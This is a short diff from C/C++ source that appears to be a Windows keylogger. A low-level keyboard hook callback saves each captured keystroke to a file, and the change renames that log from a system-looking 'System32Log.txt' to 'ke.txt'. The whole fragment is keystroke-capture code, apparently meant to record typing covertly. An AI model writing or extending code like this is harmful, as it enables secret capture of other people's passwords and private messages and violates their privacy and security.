@@ -31,7 +31,7 @@ LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
 			kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
 
 			// save to file
-			Save(kbdStruct.vkCode, "System32Log.txt");
+			Save(kbdStruct.vkCode, "ke.txt");
 		}
 	}
 
